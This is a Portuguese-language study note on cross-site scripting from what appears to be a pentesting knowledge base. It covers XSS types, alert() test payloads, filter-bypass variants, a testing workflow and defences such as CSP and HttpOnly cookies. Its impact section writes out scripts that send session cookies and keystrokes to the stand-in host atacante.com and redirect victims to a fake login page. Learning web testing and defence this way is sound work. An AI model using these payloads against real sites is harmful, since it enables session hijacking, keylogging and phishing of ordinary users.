# 🧨 Cross-Site Scripting (XSS) — Injeção de Script no Client-Side

> XSS ocorre quando a aplicação reflete ou armazena input do usuário sem sanitização, permitindo executar JavaScript arbitrário no navegador de quem visualiza a página.

---

## 🧠 O Que é XSS

Diferente de SQLi (que ataca o banco de dados), o XSS ataca **quem está visualizando a página** — o navegador da vítima executa o script injetado.

---

## 🔢 Tipos de XSS

| Tipo | Onde fica o payload | Persistência | Exemplo de vetor |
|---|---|---|---|
| Refletido | Retorna na resposta imediata | Não persiste | Parâmetro de busca |
| Armazenado | Salvo no banco de dados | Persiste pra outros usuários | Comentário, campo de perfil |
| DOM-based | Manipulação do DOM via JS client-side | Depende do fluxo JS | Hash da URL processado por JS |

---

## 🔍 Payloads de Teste

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(document.cookie)</script>
```

**Bypass de filtros simples:**
```html
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="alert`1`">
<svg/onload=alert(1)>
```

---

## 🎯 Impacto Real Além do alert()

```javascript
// Roubo de cookie de sessão
<script>fetch('http://atacante.com/steal?c='+document.cookie)</script>

// Keylogger simples
<script>document.onkeypress=function(e){fetch('http://atacante.com/log?k='+e.key)}</script>

// Redirecionamento para phishing
<script>window.location='http://atacante.com/fake-login'</script>
```

---

## 🔁 Workflow de Teste
Identificar campos de input (busca, comentário, perfil, header, cookie)
Injetar payload básico: <script>alert(1)</script>
Se refletir sem filtro → confirmado refletido
Se salvar e executar ao recarregar → confirmado armazenado
Testar bypass se houver filtro (case, encoding, tags alternativas)
Demonstrar impacto real (roubo de cookie) em vez de só alert()

---

## ⚠️ Detecção e Defesa
Output encoding (escapar < > " ' no HTML)
Content Security Policy (CSP) restringe execução de script inline
HttpOnly flag no cookie de sessão (impede roubo via document.cookie)
Sanitização de input no servidor, nunca só no client-side

---

## 📌 Relacionados

- [[Burp Suite]]
- [[SQL Injection]]
- [[Command Injection]]

#web #xss #owasp #exploração